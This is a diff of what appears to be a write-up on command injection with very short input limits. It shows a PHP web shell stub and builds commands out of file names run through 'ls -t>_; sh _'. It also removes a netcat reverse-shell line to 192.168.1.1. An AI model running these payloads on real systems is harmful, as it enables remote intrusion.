@@ -36,7 +36,7 @@ cat cmd.php # <?php system('id'); ?>
 >\ \\
 >cat\\
 
-ls -t>_
+ls -t>_ # sort by time, in real senario, we have to write a file for this task, just like below
 
 sh _
 # hello
@@ -52,27 +52,6 @@ cat _
 #ex.\
 #php
 #index.php
-```
-
-
-
-Sure all we need is just `m4 *`, but showing stream flow and filename open a new page for RCE, example with command injection limited to 5 characters:
-```bash
-# form
->nc\\
->19\\
->2.\\
->16\\
->8.\\
->1.\\
->1.\\
->\ \\
->-e\\
->\\\\
-#.....
-ls -t>_
-# ....
-sh _ # bash nc 192.168.1.1 8080 -e /bin/sh
 ```
 
 # References:
